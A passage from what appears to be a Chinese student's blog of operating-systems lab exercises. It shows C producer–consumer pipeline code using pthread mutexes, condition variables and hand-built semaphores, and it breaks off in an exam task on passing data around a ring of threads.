class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAPACITY 4</span></span><br><span class="line"><span class="keyword">int</span> buffer1[CAPACITY];</span><br><span class="line"><span class="keyword">int</span> buffer2[CAPACITY];</span><br><span class="line"><span class="keyword">int</span> in1, in2;</span><br><span class="line"><span class="keyword">int</span> out1, out2;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer1_is_empty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> in1 == out1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer1_is_full</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (in1 + <span class="number">1</span>) % CAPACITY == out1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_item1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    item = buffer1[out1];</span><br><span class="line">    out1 = (out1 + <span class="number">1</span>) % CAPACITY;</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_item1</span><span class="params">(<span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buffer1[in1] = item;</span><br><span class="line">    in1 = (in1 + <span class="number">1</span>) % CAPACITY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer2_is_empty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> in2 == out2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer2_is_full</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (in2 + <span class="number">1</span>) % CAPACITY == out2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_item2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    item = buffer2[out2];</span><br><span class="line">    out2 = (out2 + <span class="number">1</span>) % CAPACITY;</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_item2</span><span class="params">(<span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buffer2[in2] = item;</span><br><span class="line">    in2 = (in2 + <span class="number">1</span>) % CAPACITY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> mutex1;</span><br><span class="line"><span class="keyword">pthread_mutex_t</span> mutex2;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> wait_empty_buffer1;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> wait_full_buffer1;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> wait_empty_buffer2;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> wait_full_buffer2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ITEM_COUNT (CAPACITY * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">consume</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ITEM_COUNT; i++) &#123; </span><br><span class="line">        pthread_mutex_lock(&amp;mutex2);</span><br><span class="line">        <span class="keyword">while</span> (buffer2_is_empty())</span><br><span class="line">            pthread_cond_wait(&amp;wait_full_buffer2, &amp;mutex2);</span><br><span class="line"></span><br><span class="line">        item = get_item2(); </span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"    consume item: %c\n"</span>, item); </span><br><span class="line"></span><br><span class="line">        pthread_cond_signal(&amp;wait_empty_buffer2);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">calculate</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ITEM_COUNT; i++) &#123; </span><br><span class="line">        pthread_mutex_lock(&amp;mutex1);</span><br><span class="line">        <span class="keyword">while</span> (buffer1_is_empty())</span><br><span class="line">            pthread_cond_wait(&amp;wait_full_buffer1, &amp;mutex1);</span><br><span class="line"></span><br><span class="line">        item = get_item1(); </span><br><span class="line"></span><br><span class="line">        pthread_cond_signal(&amp;wait_empty_buffer1);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex1);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;mutex2);</span><br><span class="line">        <span class="keyword">while</span> (buffer2_is_full())</span><br><span class="line">            pthread_cond_wait(&amp;wait_empty_buffer2, &amp;mutex2);</span><br><span class="line">        item = <span class="built_in">toupper</span>(item);</span><br><span class="line">        put_item2(item);</span><br><span class="line">        <span class="comment">// printf("  calculate item: %c\n", item); </span></span><br><span class="line"></span><br><span class="line">        pthread_cond_signal(&amp;wait_full_buffer2);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">produce</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ITEM_COUNT; i++) &#123; </span><br><span class="line">        pthread_mutex_lock(&amp;mutex1);</span><br><span class="line">        <span class="keyword">while</span> (buffer1_is_full()) </span><br><span class="line">            pthread_cond_wait(&amp;wait_empty_buffer1, &amp;mutex1);</span><br><span class="line"></span><br><span class="line">        item = <span class="string">'a'</span> + i;</span><br><span class="line">        put_item1(item);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"produce item: %c\n"</span>, item); </span><br><span class="line"></span><br><span class="line">        pthread_cond_signal(&amp;wait_full_buffer1);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">pthread_t</span> consumer_tid;</span><br><span class="line">    <span class="keyword">pthread_t</span> calculate_tid;</span><br><span class="line">    <span class="keyword">pthread_t</span> produce_tid;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_init(&amp;mutex1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_init(&amp;mutex2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;wait_empty_buffer1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;wait_full_buffer1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;wait_empty_buffer2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;wait_full_buffer2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;consumer_tid, <span class="literal">NULL</span>, consume, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;calculate_tid, <span class="literal">NULL</span>, calculate, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;produce_tid, <span class="literal">NULL</span>, produce, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// produce(NULL); </span></span><br><span class="line">    pthread_join(produce_tid, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(calculate_tid, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(consumer_tid, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="75-pc2ctask-10"><a class="markdownIt-Anchor" href="#75-pc2ctask-10"></a> 7.5 pc2.c(Task 10)</h2><ul><li>功能和前面的实验相同，使用信号量解决</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAPACITY 4</span></span><br><span class="line"><span class="keyword">int</span> buffer1[CAPACITY];</span><br><span class="line"><span class="keyword">int</span> buffer2[CAPACITY];</span><br><span class="line"><span class="keyword">int</span> in1, in2;</span><br><span class="line"><span class="keyword">int</span> out1, out2;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer1_is_empty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> in1 == out1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer1_is_full</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (in1 + <span class="number">1</span>) % CAPACITY == out1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_item1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    item = buffer1[out1];</span><br><span class="line">    out1 = (out1 + <span class="number">1</span>) % CAPACITY;</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_item1</span><span class="params">(<span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buffer1[in1] = item;</span><br><span class="line">    in1 = (in1 + <span class="number">1</span>) % CAPACITY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer2_is_empty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> in2 == out2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer2_is_full</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (in2 + <span class="number">1</span>) % CAPACITY == out2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_item2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    item = buffer2[out2];</span><br><span class="line">    out2 = (out2 + <span class="number">1</span>) % CAPACITY;</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_item2</span><span class="params">(<span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buffer2[in2] = item;</span><br><span class="line">    in2 = (in2 + <span class="number">1</span>) % CAPACITY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">pthread_cond_t</span> cond;</span><br><span class="line">&#125; <span class="keyword">sema_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_init</span><span class="params">(<span class="keyword">sema_t</span> *sema, <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sema-&gt;value = value;</span><br><span class="line">    pthread_mutex_init(&amp;sema-&gt;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;sema-&gt;cond, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_wait</span><span class="params">(<span class="keyword">sema_t</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;sema-&gt;mutex);</span><br><span class="line">    <span class="keyword">while</span> (sema-&gt;value &lt;= <span class="number">0</span>)</span><br><span class="line">        pthread_cond_wait(&amp;sema-&gt;cond, &amp;sema-&gt;mutex);</span><br><span class="line">    sema-&gt;value--;</span><br><span class="line">    pthread_mutex_unlock(&amp;sema-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_signal</span><span class="params">(<span class="keyword">sema_t</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;sema-&gt;mutex);</span><br><span class="line">    ++sema-&gt;value;</span><br><span class="line">    pthread_cond_signal(&amp;sema-&gt;cond);</span><br><span class="line">    pthread_mutex_unlock(&amp;sema-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sema_t</span> mutex_sema1;</span><br><span class="line"><span class="keyword">sema_t</span> mutex_sema2;</span><br><span class="line"><span class="keyword">sema_t</span> empty_buffer_sema1;</span><br><span class="line"><span class="keyword">sema_t</span> empty_buffer_sema2;</span><br><span class="line"><span class="keyword">sema_t</span> full_buffer_sema1;</span><br><span class="line"><span class="keyword">sema_t</span> full_buffer_sema2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ITEM_COUNT (CAPACITY * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">consume</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ITEM_COUNT; i++) &#123; </span><br><span class="line">        sema_wait(&amp;full_buffer_sema2);</span><br><span class="line">        sema_wait(&amp;mutex_sema2);</span><br><span class="line"></span><br><span class="line">        item = get_item2();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"    consume item: %c\n"</span>, item); </span><br><span class="line"></span><br><span class="line">        sema_signal(&amp;mutex_sema2);</span><br><span class="line">        sema_signal(&amp;empty_buffer_sema2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">calculate</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ITEM_COUNT; i++) &#123; </span><br><span class="line">        sema_wait(&amp;full_buffer_sema1);</span><br><span class="line">        sema_wait(&amp;mutex_sema1);</span><br><span class="line"></span><br><span class="line">        item = get_item1();</span><br><span class="line">        <span class="comment">// printf("    consume item: %c\n", item); </span></span><br><span class="line"></span><br><span class="line">        sema_signal(&amp;mutex_sema1);</span><br><span class="line">        sema_signal(&amp;empty_buffer_sema1);</span><br><span class="line"></span><br><span class="line">        sema_wait(&amp;empty_buffer_sema2);</span><br><span class="line">        sema_wait(&amp;mutex_sema2);</span><br><span class="line"></span><br><span class="line">        item = <span class="built_in">toupper</span>(item);</span><br><span class="line">        put_item2(item);</span><br><span class="line">        <span class="comment">// printf("  calculate item: %c\n", item); </span></span><br><span class="line"></span><br><span class="line">        sema_signal(&amp;mutex_sema2);</span><br><span class="line">        sema_signal(&amp;full_buffer_sema2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">produce</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ITEM_COUNT; i++) &#123; </span><br><span class="line">        sema_wait(&amp;empty_buffer_sema1);</span><br><span class="line">        sema_wait(&amp;mutex_sema1);</span><br><span class="line"></span><br><span class="line">        item = i + <span class="string">'a'</span>;</span><br><span class="line">        put_item1(item);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"produce item: %c\n"</span>, item); </span><br><span class="line"></span><br><span class="line">        sema_signal(&amp;mutex_sema1);</span><br><span class="line">        sema_signal(&amp;full_buffer_sema1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">pthread_t</span> consumer_tid;</span><br><span class="line">    <span class="keyword">pthread_t</span> calculate_tid;</span><br><span class="line">    <span class="keyword">pthread_t</span> produce_tid;</span><br><span class="line"></span><br><span class="line">    sema_init(&amp;mutex_sema1, <span class="number">1</span>);</span><br><span class="line">    sema_init(&amp;empty_buffer_sema1, CAPACITY - <span class="number">1</span>);</span><br><span class="line">    sema_init(&amp;full_buffer_sema1, <span class="number">0</span>);</span><br><span class="line">    sema_init(&amp;mutex_sema2, <span class="number">1</span>);</span><br><span class="line">    sema_init(&amp;empty_buffer_sema2, CAPACITY - <span class="number">1</span>);</span><br><span class="line">    sema_init(&amp;full_buffer_sema2, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;consumer_tid, <span class="literal">NULL</span>, consume, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;calculate_tid, <span class="literal">NULL</span>, calculate, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;produce_tid, <span class="literal">NULL</span>, produce, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// produce(NULL); </span></span><br><span class="line">    pthread_join(produce_tid, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(calculate_tid, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(consumer_tid, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="task-11考试"><a class="markdownIt-Anchor" href="#task-11考试"></a> Task 11+考试</h1><h2 id="112-ringc"><a class="markdownIt-Anchor" href="#112-ringc"></a> 11.2 ring.c</h2><p>1、实现线循环</p><p>2、创建N个线程</p><p>N个线程构成一个环</p><p>主线程向T1发送数据0</p><p>T1收到数据后，将数据加1，向T2发送数据1</p><p>T2收到数据后，将数据加1，向T3发送数据2</p><p>T3收到数据后，将数据加1，向T4发送数据3</p><p>…</p><p>3、创建N个缓冲区</p><p>4、每个线程有一个输入缓冲和一个输出缓冲</p><p>5、最终的系统结构如下</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-06-25_23-25-39.png" width="250" height="250" alt="图片名称" align="center" id="173"><p>6、本程序不能使用任何全局变量，如果使用了全局变量，本题没有得分</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 10</span></span><br><span class="line"><span class="meta">#<span 